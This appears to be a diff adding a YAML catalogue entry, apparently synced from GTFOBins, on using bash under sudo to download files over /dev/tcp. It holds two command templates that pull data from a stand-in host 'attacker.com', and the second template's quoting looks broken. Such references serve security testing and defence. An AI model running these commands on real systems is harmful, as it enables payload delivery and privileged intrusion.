@@ -1,0 +1,27 @@
+id: gtfobins/bash/download/sudo
+type: binary
+platform: linux
+name: bash
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\\
+    n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\"\
+    \ = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'"
+- template: bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
+references:
+- https://gtfobins.github.io/gtfobins/bash/
+tags:
+- linux
+- unix
+- gtfobins
